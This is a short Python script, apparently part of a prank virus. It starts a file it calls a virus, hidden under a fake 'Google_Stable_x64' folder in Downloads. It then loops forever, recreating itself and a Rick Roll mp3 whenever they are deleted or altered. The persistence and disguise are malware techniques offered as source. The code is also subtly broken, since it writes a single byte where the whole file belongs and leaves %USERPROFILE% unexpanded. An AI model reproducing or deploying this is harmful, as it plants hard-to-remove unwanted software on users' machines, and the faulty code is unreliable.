import os, time
from multiprocessing import Process

# Backup file, file to check
files_to_backup = [
  (__file__, __file__),
  (os.path.join("%USERPROFILE%/Downloads/Google_Stable_x64/assets/cache/", "youtube_com-watch-dQw4w9WgXcQ.mp3"), os.path.join("%USERPROFILE%/Music/", "youtube_com-watch-dQw4w9WgXcQ.mp3"))
]

backuped_files = [open(path, "rb").read() for path, _ in files_to_backup]

virus_path = "%USERPROFILE%/Downloads/Google_Stable_x64/assets/cache/youtube_com.py"

start_virus = lambda: os.system(f"python {virus_path}")
virus_thread = Process(target=start_virus)
virus_thread.start()


while True:
  for index, file_paths in enumerate(files_to_backup):
    backup = backuped_files[index]
    for path in file_paths:
      if not os.path.exists(path) or open(path, "rb").read() != backup:
        with open(path, "wb") as file:
          file.write(backup[index])
  time.sleep(1)

